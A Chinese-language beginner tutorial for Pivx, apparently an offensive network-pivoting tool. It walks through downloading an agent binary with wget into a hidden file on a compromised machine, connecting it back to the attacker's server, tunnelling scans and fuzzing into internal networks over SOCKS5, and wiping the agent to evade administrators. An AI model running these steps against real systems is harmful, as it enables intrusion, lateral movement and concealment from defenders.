[English](TUTORIAL.md) | [Español](TUTORIAL_es.md) | [Português](TUTORIAL_pt.md) | [中文](TUTORIAL_zh.md)

[← 返回 README](../README.md)

# 🎮 快速指南：Pivx 新手入门

## 什么是 Pivx？

想象一下，你要调查的网络是一座**上锁并有守卫的城堡**。Pivx 就是一扇**隐形的魔法传送门**。你不需要与复杂的网络配置搏斗，只需在自己的电脑上建立一个可视化的"指挥中心"，然后派遣一个"特工"潜入城堡内部。当两者连接成功后，你就可以从外面使用你所有的工具，就像你本人坐在城堡里面一样。

---

## 🚀 步骤 1：你的指挥中心

首先，让我们启动你的安全行动基地。

- 打开你的攻击终端，输入启动命令：

```bash
sudo server/venv/bin/streamlit run server/app.py
```

- 打开你喜欢的浏览器，访问：**http://localhost:8501**
- 查看你全新的 Web 控制面板 —— 从这里你可以通过简单的点击来管理所有路由和连接。

---

## 🕵️‍♂️ 步骤 2：秘密特工

现在我们需要让潜入者从城堡内部为我们打开大门。

- 将 `pivx-agent-linux-amd64` 文件上传到你已经控制的目标机器上：

```bash
wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
chmod +x /tmp/.p
```

- 启动特工，告诉它你的基地在哪里：

```bash
/tmp/.p --server ws://<你的攻击机IP>:8765
```

- 返回你的 Web 面板，当你看到你的秘密特工在表格中显示为 **"online"** 时，尽情庆祝吧。🎉

---

## 🪄 步骤 3：你的超能力

传送门已经打开，你的特殊技能现在可以直接从你的机器上使用了。

### 🛡️ 雷达（Smartping）

使用 `ping` 等常规命令或对城堡中的机器发起快速扫描；特工会代替它们回应。

```bash
ping 10.10.20.100
nmap -sn 10.10.20.0/24
```

### 🎭 伪装术（SOCKS5）

点击 Web 面板中的 **"Start SOCKS5"** 按钮，在本地 **1080** 端口开启一条安全隧道。

```bash
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.100/
```

### 🔍 潜入者的放大镜

配置 Burp Suite、ffuf 或 proxychains 等工具，将代理指向 `127.0.0.1:1080`，然后分析整个城堡。

```bash
proxychains -q nmap -sT -Pn -p 80,443 10.10.20.100
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.100/FUZZ -w wordlist.txt
```

### 🪞 魔镜（Magic IP）

如果你想查看目标机器上隐藏了哪些秘密程序，只需在浏览器或工具中访问 `http://240.0.0.1`：

```bash
curl --socks5-hostname 127.0.0.1:1080 http://240.0.0.1:8080/
```

魔法地址 `240.0.0.1` 会自动转换为特工的 `127.0.0.1`。

### 🔴 紧急按钮（Kill Switch）

如果你发现网络管理员正在追踪你，按下面板上红色的 **"Kill"** 按钮，特工将瞬间自毁。不留痕迹，没有残留文件。

---

> ⚠️ **仅限在你拥有或获得明确书面授权的系统上使用。**
